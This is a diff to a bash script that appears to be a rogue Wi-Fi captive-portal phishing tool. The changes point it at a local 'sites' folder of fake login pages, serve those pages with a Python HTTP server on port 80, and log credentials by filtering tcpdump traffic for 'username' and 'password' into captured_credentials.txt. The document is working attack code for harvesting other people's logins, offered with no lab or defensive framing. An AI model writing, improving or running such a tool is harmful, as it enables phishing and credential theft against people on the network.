@@ -1,5 +1,9 @@
 #!/bin/bash
 
+# Get the directory where the script is located
+SCRIPT_DIR="$( cd "$( dirname "${BASH_SOURCE[0]}" )" &> /dev/null && pwd )"
+SITES_DIR="$SCRIPT_DIR/sites"
+
 # Function to clear the terminal
 clear_terminal() {
     clear
@@ -129,13 +133,9 @@ start_captive_portal() {
 serve_login_page() {
     interface=$1
     echo "Serving login page on interface: $interface"
-    cd /var/www/html
+    cd $SITES_DIR/$server
     while true; do
-        login_page=$(find /path/to/sites/$server -name "login.php" | head -n 1)
-        if [ -n "$login_page" ]; then
-            cp $login_page index.php
-        fi
-        sleep 5
+        python3 -m http.server 80 > /dev/null 2>&1
     done
 }
 
@@ -143,7 +143,7 @@ serve_login_page() {
 capture_credentials() {
     interface=$1
     echo "Capturing credentials on interface: $interface"
-    tcpdump -i $interface -A dst port 80 or dst port 443 | grep -i "username\|password" >> captured_credentials.txt
+    tcpdump -i $interface -A dst port 80 or dst port 443 | grep -i "username\|password" >> $SCRIPT_DIR/captured_credentials.txt
 }
 
 # Main script starts here
